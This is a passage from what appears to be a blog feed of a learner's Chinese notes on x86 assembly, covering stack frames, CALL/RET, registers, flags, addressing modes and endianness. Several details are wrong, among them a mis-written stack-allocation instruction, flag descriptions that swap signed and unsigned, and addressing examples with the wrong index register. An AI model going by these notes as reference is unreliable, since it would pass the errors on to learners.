/通用寄存器/内存地址</p><p>把栈里面的值按照相同的数据宽度，取出来放入对应的通用寄存器或者内存地址中</p><p>用了过后，esp会增加，比如：esp+4，取出书后，底部又往下了。</p><hr><p>修改eip的指令</p><p>eip，指向的是CPU要指向的指令的地址。</p><h2 id="JMP"><a href="#JMP" class="headerlink" title="JMP"></a>JMP</h2><p>跳转指令，强行跳转</p><p>JMP 寄存器/内存/立即数</p><p>跳转到某个地方开始执行代码。</p><h2 id="CALL"><a href="#CALL" class="headerlink" title="CALL"></a>CALL</h2><p>调用某个地址</p><p>CALL 寄存器/内存/立即数</p><p>就和调用函数一样，它首先会吧下一条指令的地址压入栈。等会调用玩后再调回来继续执行指令，也就是PUSH EIP</p><h2 id="RET"><a href="#RET" class="headerlink" title="RET"></a>RET</h2><p>返回</p><p>配合着CALL使用的，当函数弄完后，POP EIP ，吧EIP的值返回到和之前的一样，继续去执行之前的代码</p><h1 id="3-堆栈的详细理解"><a href="#3-堆栈的详细理解" class="headerlink" title="3.堆栈的详细理解"></a>3.堆栈的详细理解</h1><h2 id="什么是栈？"><a href="#什么是栈？" class="headerlink" title="什么是栈？"></a>什么是栈？</h2><p>说白了，就是一段能被特殊使用的内存空间。【先进后出】</p><p>入栈和出栈，不是说把值给清了，本质上是一个copy的过程，只是指针的位置变了，不能访问到罢了，意思就是说pop后，原本内存中的值还是在哪里，而没有被清0。差不多能懂就ok</p><h2 id="栈帧是什么？"><a href="#栈帧是什么？" class="headerlink" title="栈帧是什么？"></a>栈帧是什么？</h2><p>在我看来就是一种栈的格式。本质上也是栈，这种栈有专门的用途，用来保存函数调用过程中的各种信息【参数，返回地址，本地变量…】栈帧有栈顶和栈底之分，SP指向栈顶。在32位中，%ebp指向栈底，也就是基地址；esp指向栈顶，栈指针咯</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506141014961.png" alt="image-20230506141014961"></p><p>我们把这个%ebp到%esp之间的区域当作栈帧。</p><p>每调用一个函数，就会产生一个新的栈帧。在函数调用里面，把调用函数的函数称为“调用者”被调用的函数“被调用者”</p><p>在这个过程中，调用者需要知道在哪里获取被调用着的返回的值，被调用者返回后%ebp,%esp寄存器的值应该和调用前一致。所以就需要用栈来保存这些数据</p><p>【这一段迷迷糊糊的无所谓，实在不行就在学学计算机原理咯，我先学学后面的哈哈哈】</p><h2 id="C函数调用过程原理和函数栈帧分析"><a href="#C函数调用过程原理和函数栈帧分析" class="headerlink" title="C函数调用过程原理和函数栈帧分析"></a>C函数调用过程原理和函数栈帧分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">long</span> <span class="title function_">add</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">long</span> x = a, y = b;</span><br><span class="line"> <span class="keyword">return</span> (x + y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">long</span> a = <span class="number">1</span>, b = <span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, add(a, b));</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>啊这……..就不分析啦</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MyFunction</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, c;</span><br><span class="line">a = <span class="number">10</span>;</span><br><span class="line">b = <span class="number">5</span>;</span><br><span class="line">c = <span class="number">2</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">TestFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">1</span>, y = <span class="number">2</span>, z = <span class="number">3</span>;</span><br><span class="line">MyFunction1(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok,当MyFunction函数被调用的时候，汇编代码大致如下，这个汇编和我学的好像又不太一样….在使用mov的时候</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_MyFunction:</span><br><span class="line">push %ebp ; <span class="comment">//保存%ebp的值</span></span><br><span class="line">movl %esp, $ebp ; <span class="comment">//将%esp的值赋给%ebp，使新的%ebp指向栈顶；这里传参的方向好像不太一样....</span></span><br><span class="line">movl <span class="number">-12</span>(%esp), %esp ; <span class="comment">//分配额外空间给本地变量</span></span><br><span class="line">movl $<span class="number">10</span>, <span class="number">-4</span>(%ebp) ;</span><br><span class="line">movl $<span class="number">5</span>, <span class="number">-8</span>(%ebp) ;</span><br><span class="line">movl $<span class="number">2</span>, <span class="number">-12</span>(%ebp) ;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230506142839487.png" alt="image-20230506142839487"></p><p>ok 这个看得我云里雾里的，我们来理解一下哈</p><p>1.首先被调用数的参数按照从从右往左的顺序压入栈中。【这个在win32中看到过，应该懂吧，至于为什么从右往左，因为这个是规定，也又从左往右的~】</p><p>2.把原本执行代码的地址压入栈中，也就是要返回的地址压入栈</p><p>ok，上面这2步都是调用者负责的，所以这也就是调用者的栈帧</p><p>3.把原本的%ebp压入栈中，因为这段空间是临时开辟的，用完这个函数还得回去嘞，所以就需要把之前的指针先保存起来</p><p>4.把%esp的值给%ebp，下面就让ebp来充当指针咯，这里讲的轻松，其实一点也不轻松。</p><p>这里可以去看看我写的win32汇编中，的某级中，肯定写过堆栈平衡。或者百度一下啦。</p><hr><h2 id="这里我也简单讲讲我理解的堆栈平衡"><a href="#这里我也简单讲讲我理解的堆栈平衡" class="headerlink" title="这里我也简单讲讲我理解的堆栈平衡"></a>这里我也简单讲讲我理解的堆栈平衡</h2><p>esp：扩展栈指针寄存器，是指针寄存器的一种，用于存放函数栈顶指针（栈顶指针）<br>ebp：扩展基址指针寄存器，也被称为帧指针寄存器，用于存放函数栈底指针（栈底指针）。</p><p>ebp只是存取某时刻的esp，这个时刻就是进入一个函数内后，cpu会将esp的值赋给ebp，此时就可以通过ebp对栈进行操作，比如获取函数参数，局部变量等，实际上使用esp也可以，只是esp可能会变化，去数据的时候很不方便</p><p>首先，这个栈帧，emmm我不是很理解，也许也就是这样定义的吧，定义出这样一个格式，以至于后面可能好将一点或者方便理解</p><p>子程序是如何使用传递的参数？这个我们得知道，这样就方便我们理解一下</p><p>首先，调用者，把要传递的参数都先压入栈中，因为这个栈也就是内存的一部分三，被调用者就可以去访问这个内存空间，然后从中获取到参数。</p><p>所以说，调用者首先把这个参数压入栈中，IP才跳转到这个函数的位置，在这个函数执行完过后，又需要返回到原来代码执行的位置，所以就需要把返回地址也压入栈中。这就是调用者的作用</p><p>临时使用的这个堆栈中的数不在有用，所以就需要把栈指针修正到调用前的状态。这个修正是谁修正呢？，调用者和被调用者都可以，和压入参数的方式一样都是有约定的，不同的语言有不同的方式。</p><p>所以这个，比如说要调用某个函数</p><p>编译后可能是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push 参数</span><br><span class="line">push 参数</span><br><span class="line">...</span><br><span class="line">call 某函数</span><br></pre></td></tr></table></figure><p>某函数中的反汇编之后的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>emmmmm，说了半天好像也是迷迷糊糊的，不要紧，我们来看一个例子</p><p>原文链接：<a href="https://blog.csdn.net/qq_41683305/article/details/104249224">https://blog.csdn.net/qq_41683305/article/details/104249224</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">function_add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a=<span class="number">1</span>,b=<span class="number">1</span>,sum=<span class="number">0</span>;</span><br><span class="line">sum=function_add(a,b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sum=%d&quot;</span>,sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">function_add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个代码的关键点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a=1,b=1,sum=0;</span><br><span class="line">sum=function_add(a,b);</span><br></pre></td></tr></table></figure><p>把这两句反汇编一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int a=1,b=1,sum=0;</span><br><span class="line">00401038 C7 45 FC 01 00 00 00   mov         dword ptr [ebp-4],1 ;偏移地址为[ebp-4]存放1</span><br><span class="line">0040103F C7 45 F8 01 00 00 00   mov         dword ptr [ebp-8],1;偏移地址为[ebp-8]存放1</span><br><span class="line">00401046 C7 45 F4 00 00 00 00   mov         dword ptr [ebp-0Ch],0;偏移地址为[ebp-0ch]存放0</span><br><span class="line">--------------------------------------------------------------------------------------------</span><br><span class="line">sum=function_add(a,b);</span><br><span class="line">0040104D 8B 45 F8             mov         eax,dword ptr [ebp-8];eax的值设置为1</span><br><span class="line">00401050 50                        push        eax;压入栈</span><br><span class="line">00401051 8B 4D FC             mov         ecx,dword ptr [ebp-4];ecx的值设置为1</span><br><span class="line">00401054 51                   push        ecx;入栈</span><br><span class="line">00401055 E8 AB FF FF FF       call        @ILT+0(function_add) (00401005)</span><br><span class="line">0040105A 83 C4 08             add         esp,8</span><br><span class="line">;由于上面push了2次，dw型的，所以这里需要add esp,8</span><br><span class="line">;作用也就是把指针还原回去呗</span><br><span class="line">0040105D 89 45 F4             mov         dword ptr [ebp-0Ch],eax</span><br></pre></td></tr></table></figure><p>注意看，这个干啥干啥的时候都是用的这个ebp..这些a b sum 啊啥的，其实都是标号罢了。本质上还是某个内存空间</p><p>然后就是去执行这个call</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">12:   int function_add(int a,int b)</span><br><span class="line">13:   &#123;</span><br><span class="line">004010A0 55                   push        ebp</span><br><span class="line">004010A1 8B EC                mov         ebp,esp</span><br><span class="line">004010A3 83 EC 40             sub         esp,40h</span><br><span class="line">004010A6 53                   push        ebx</span><br><span class="line">004010A7 56                   push        esi</span><br><span class="line">004010A8 57                   push        edi</span><br><span class="line">004010A9 8D 7D C0             lea         edi,[ebp-40h]</span><br><span class="line">004010AC B9 10 00 00 00       mov         ecx,10h</span><br><span class="line">004010B1 B8 CC CC CC CC       mov         eax,0CCCCCCCCh</span><br><span class="line">004010B6 F3 AB                rep stos    dword ptr [edi]</span><br><span class="line">14:       return a+b;</span><br><span class="line">004010B8 8B 45 08             mov         eax,dword ptr [ebp+8]</span><br><span class="line">004010BB 03 45 0C             add         eax,dword ptr [ebp+0Ch]</span><br><span class="line">15:</span><br><span class="line">16:   &#125;</span><br><span class="line">004010BE 5F                   pop         edi</span><br><span class="line">004010BF 5E                   pop         esi</span><br><span class="line">004010C0 5B                   pop         ebx</span><br><span class="line">004010C1 8B E5                mov         esp,ebp</span><br><span class="line">004010C3 5D                   pop         ebp</span><br><span class="line">004010C4 C3                   ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004010A3 83 EC 40             sub         esp,40h</span><br></pre></td></tr></table></figure><p>这句话，其实也就是开辟了一段栈空间，这段空间也是人为规定的。本质上还是内存空间，起了一个名字而已</p><p>这下能理解了吧，其实这个原文将得真聪明。</p><p>okokok </p><p>我懂了</p><p>ebp=&gt;暂时用一下</p><p>esp才是真二八经的栈指针。以至于为什么要使用ebp呢？是因为在子程序中可能还会有push或者pop命令，这样esp的值就会自动改变，就不能指向这个你所需要的参数的位置。这下懂了吧，哈哈哈。</p><p>【这个指针的概念也是人为规定上去的，不要被搞迷糊了】</p><p>在函数里，都是通过ebp对栈的数据进行操作的，比如获取参数的值，</p><p>因为在函数里，esp的值可能是变化的，ebp的值不变，通过ebp来操作数据很方便</p><p>最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004010C1 8B E5                mov         esp,ebp</span><br><span class="line">004010C3 5D                   pop         ebp</span><br></pre></td></tr></table></figure><p>将esp，ebp的值变成调用function_add之前的值，这样看起来只是实现函数的功能，其他并没有啥变化，再使用ret语句，返回去，然后继续往下执行语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040105A 83 C4 08             add         esp,8</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>esp始终指向栈顶，ebp只要在调用函数时，取值为栈顶，这样可方便对数据的操作</li><li>函数调用时，EBP的值入栈，然后ESP的值传给EBP。函数调用结束后，EBP将值传回ESP，ESP又指向了原来的栈顶地址。这样看起来只是实现函数的功能，其他看起来没有变化</li></ol><p>ok 如果还不懂，再去别的地方看看吧。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言讲解（2）</title>
      <link href="/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-2-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/05/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-2-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="1-汇编语言简介和发开环境搭建"><a href="#1-汇编语言简介和发开环境搭建" class="headerlink" title="1.汇编语言简介和发开环境搭建"></a>1.汇编语言简介和发开环境搭建</h1><h2 id="汇编语言介绍"><a href="#汇编语言介绍" class="headerlink" title="汇编语言介绍"></a>汇编语言介绍</h2><p>编辑-弄成汇编程序-连接程序-调试程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masm一下 -&gt; link一下 -&gt; debug一下</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">编程 -&gt; .asm -&gt; 编译 -&gt; .obj -&gt; 链接 -&gt; .exe -&gt; 加载 -&gt; 内存中的程序 -&gt; 运⾏</span><br><span class="line">(edit) (masm) (link) (command) (CPU)</span><br></pre></td></tr></table></figure><p>这里需要下载一个masm 的一个集成环境【在虚拟机里面搞】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230505134948035.png" alt="image-20230505134948035"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">;完整段的Hello World程序</span><br><span class="line">DATAS  SEGMENT</span><br><span class="line">     STRING  DB  &#x27;Hello World!&#x27;,13,10,&#x27;$&#x27;</span><br><span class="line">DATAS  ENDS</span><br><span class="line"></span><br><span class="line">CODES  SEGMENT;codes</span><br><span class="line">     ASSUME    CS:CODES,DS:DATAS</span><br><span class="line">START:</span><br><span class="line">     MOV  AX,DATAS</span><br><span class="line">     MOV  DS,AX;让ds 和 datas相互关联</span><br><span class="line">     LEA  DX,STRING;调用字符串开始地址</span><br><span class="line">     MOV  AH,9;</span><br><span class="line">     INT  21H;调用dos系统中断中的9号功能：显示字符串</span><br><span class="line">   </span><br><span class="line">     MOV  AH,4CH</span><br><span class="line">     INT  21H;调用dos系统4cH号功能：结束程序</span><br><span class="line">CODES  ENDS</span><br><span class="line">    END   START</span><br></pre></td></tr></table></figure><p>这个代码应该看得懂三。【只要你看过8086汇编】</p><h1 id="2-寄存器-x64和x86寄存器传参方式"><a href="#2-寄存器-x64和x86寄存器传参方式" class="headerlink" title="2.寄存器-x64和x86寄存器传参方式"></a>2.寄存器-x64和x86寄存器传参方式</h1><h2 id="80X86计算机组织基础知识"><a href="#80X86计算机组织基础知识" class="headerlink" title="80X86计算机组织基础知识"></a>80X86计算机组织基础知识</h2><p>计算机主要是由于CPU【运算器和控制器】，存储器，输入输出设备构成</p><h2 id="80X86寄存器组"><a href="#80X86寄存器组" class="headerlink" title="80X86寄存器组"></a>80X86寄存器组</h2><p><strong>通用寄存器</strong>——AX,BX,CX,DX,SP,BP,DI,SI八个通用寄存器【用于8086，8088】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实去看过8086汇编的也知道，具体咋使用的可以去看看</span><br></pre></td></tr></table></figure><p><strong>AX,BX,CX,DX可称为数据寄存器用来暂时存放寄存器过程中所得到的操作数，结果，其他信息。可以裁分为AH,AL来访问【16为-&gt;8位】</strong></p><ul><li>AX（accumulator）主要作为累加器使用，用于算数运算</li><li>BX（base）主要用作存储器的地址的时候，用作基地址寄存器</li><li>CX（count）用来存放数据，循环次数啥的</li><li>DX（data）用于32位数据的高16位</li></ul><p><strong>SP,BP,SI,DI主要用于偏移地址，也就是指针或者变址寄存器。不能拆分来访问</strong></p><ul><li>SP（stack pointer）堆栈指针寄存器，用来指向栈顶的偏移地址</li><li>BP（base pointer）基地址指针寄存器</li><li>SI（source index）原先的地址寄存器，确定某一个存储单元</li><li>DI（destination index）目的变地址寄存器。【和SI不同的就是SI是原先的，DI是目的的地方。比如copy一段东西，SI指向要copy内容的地址，DI指向的是要copy到哪里的地址】</li></ul><p><strong>专用寄存器IP,SP,FLAGS【OF,SF,ZF,CF,AF,PF…】</strong></p><ul><li>IP（instruction pointer）代码段的偏移地址，会自动加</li><li>SP 堆栈指针寄存器，堆栈栈顶地址，始终指向栈顶</li><li>FLAGS 标志寄存器，里面存放的是一些标志</li></ul><p><strong>6个条件标志用来记录运行结果状态的信息，是CPU自己根据运算操作来设置的</strong></p><ul><li>OF（overflow flag）为溢出标志。在运算过程中，操作数超出了机器能表示的范围称为溢出，此时OF位置为1，否则置为0.【无符号数】</li><li>SF（sign flag）为符号标志。记录运算结果的符号，结果为负时置为1，否则置为0。</li><li>ZF（zero flag）为零标志。运算结果为0时置为1，否则置为0。</li><li>CF（carry flag）为进位标志。记录运算时从最⾼有效位产⽣的进位值。例如，执⾏加法指令时，最⾼有效位有进位时置为1，否则置为0。</li><li>AF（auxiliary carry flag）为辅助进位标志。记录运算时第3位（半个字节）产⽣的进位值。进位时置为1，否则置为0。【有符号数】</li><li>PF（parity flag）为奇偶标志。当结果操作数中1的个数为偶数时置为1，否则置为0</li></ul><p><strong>段寄存器——CS,DS,SS,ES</strong></p><ul><li>CS 代码段</li><li>DS 数据段</li><li>SS 堆栈段</li><li>ES 没啥用段，多出来用的</li></ul><h1 id="3-内存存储方式"><a href="#3-内存存储方式" class="headerlink" title="3.内存存储方式"></a>3.内存存储方式</h1><h2 id="内存访问"><a href="#内存访问" class="headerlink" title="内存访问"></a>内存访问</h2><p>win32 ：windows骗了每一个程序都有4GB的独立空间，其实没有啦</p><p>32位的内存地址，也就是可寻址的空间是4GB啦【一个内存单元是8位啦】</p><p>8x2^32 (位)</p><p>8x2^32 / 8 / 1024 / 1024 / 1024 = 4G</p><p>mov 向内存中添加数据或者获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ds:[内存地址],立即数</span><br><span class="line">mov dword ptr ds:[内存地址],32位通用寄存器</span><br><span class="line">mov 32位通用寄存器,dword ptr ds:[内存地址]</span><br></pre></td></tr></table></figure><p>要注意的是：前后俩个的数据的宽度要一致哦<br>这些在汇编基础里面都有讲过，这里在回顾一下和总结一下</p><h2 id="内存地址的5种形式"><a href="#内存地址的5种形式" class="headerlink" title="内存地址的5种形式"></a>内存地址的5种形式</h2><ul><li><strong>立即数</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读：</span><br><span class="line">mov eax,dword ptr ds:[0x13ffc4]</span><br><span class="line">写：</span><br><span class="line">mov dword ptr ds:[0x13ffc4]</span><br></pre></td></tr></table></figure><ul><li><strong>[寄存器]</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">读：</span><br><span class="line">mov ecx，0x13ffd0</span><br><span class="line">mov eax,dword ptr ds:[ecx]</span><br><span class="line">写：</span><br><span class="line">mov edx,0x13ffd8</span><br><span class="line">mov dword ptr ds:[edx],0x8765431</span><br></pre></td></tr></table></figure><ul><li><strong>[寄存器+立即数]</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">读：</span><br><span class="line">mov ecx，0x13ffd0</span><br><span class="line">mov eax,dword ptr ds:[ecx+1]</span><br><span class="line">写：</span><br><span class="line">mov edx,0x13ffd8</span><br><span class="line">mov dword ptr ds:[edx+1],0x8765431</span><br></pre></td></tr></table></figure><ul><li><strong>寄存器+寄存器*{1,2,4,8}</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">读:</span><br><span class="line">mov eax, 0x13FFC4</span><br><span class="line">mov ecx, 0x2</span><br><span class="line">mov edx, dword ptr ds:[eax+eax*4]</span><br><span class="line">写：</span><br><span class="line">mov eax, 0x13FFC4</span><br><span class="line">mov ecx, 0x2</span><br><span class="line">mov dword ptr ds:[eax+eax*4], 0x87654321</span><br></pre></td></tr></table></figure><ul><li>寄存器+寄存器*{1,2,4,8}+立即数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">读：</span><br><span class="line">mov eax, 0x13FFC4 mov ecx, 0x2</span><br><span class="line">mov edx, dword ptr ds:[eax+eax*4+4]</span><br><span class="line">写：</span><br><span class="line">mov eax, 0x13FFC4</span><br><span class="line">mov ecx, 0x2</span><br><span class="line">mov dword ptr ds:[eax+eax*4+4], 0x87654321</span><br></pre></td></tr></table></figure><ul><li>注意：在读和写的时候前后俩个的宽度要一样</li></ul><h1 id="4-存储模式"><a href="#4-存储模式" class="headerlink" title="4.存储模式"></a>4.存储模式</h1><h2 id="存储模式【大，小端】"><a href="#存储模式【大，小端】" class="headerlink" title="存储模式【大，小端】"></a>存储模式【大，小端】</h2><p><strong>大端模式</strong>：数据高位放在低地址中，数据低位放在高地址中</p><p><strong>小段模式</strong>：数据低位放在低位地址中，数据高位放在高位地址中</p><p>比如：mov word ptr ds:[0x000000000],0x1A2B</p><p>大端存储:    0x00000000 =&gt; 1A    0x00000001 =&gt; 2B</p><p>小端存储:    0x00000000 =&gt; 2B    0x00000001 =&gt; 1A</p><p>其实这里就是要小心数据存储的时候去读取数据的时候读的数据内容</p><p>mov word ptr ds:[0x0012ffc4], 0x1A2B</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230505210357578.png" alt="image-20230505210357578"></p><h2 id="存储器的管理模式"><a href="#存储器的管理模式" class="headerlink" title="存储器的管理模式"></a>存储器的管理模式</h2><p>80x86系列：也就是内存分段管理，分成若干个段。每一个段的起点用一个段寄存器…</p><p>存储器的分段含义，存储单元的逻辑地址和物理地址之间的转换关系</p><p>：也就是我们在汇编入门中所说的“血汗工厂”</p><p>16位的CPU 访问20根地址线【1M】的存储空间</p><p>存储单元的逻辑地址分为：段地址和偏移量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">物理地址=段地址x16 + 偏移量</span><br></pre></td></tr></table></figure><h2 id="段寄存器的引用"><a href="#段寄存器的引用" class="headerlink" title="段寄存器的引用"></a>段寄存器的引用</h2><p>代码段：CS:IP    </p><p>数据段：DS:BX        DS:SI    </p><p>附加段：ES:BX        ES：DI    </p><p>堆栈段：SS:SP        SS:BP</p><hr><p>访问存储器⽅式 缺省的段寄存器     可选⽤的段寄存器         偏移量</p><p>取指令                             CS                                                                 IP</p><p>堆栈操作                         SS                                                                 SP</p><p>⼀般取操作数                 DS                     CS、ES、SS                 有效地址</p><p>串操作 源操作数          DS                 CS、ES、SS                    SI</p><p>⽬标操作数                     ES                             DI</p><p>使⽤指针寄存器        BP SS                     CS、DS、ES                 有效地址            </p><hr><p>在内存单元中读取数据的时候一定要注意读取方式哦【我现在遇到的都是小端读取】</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编程基础（1）</title>
      <link href="/2023/05/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-1-%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-1-%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
      
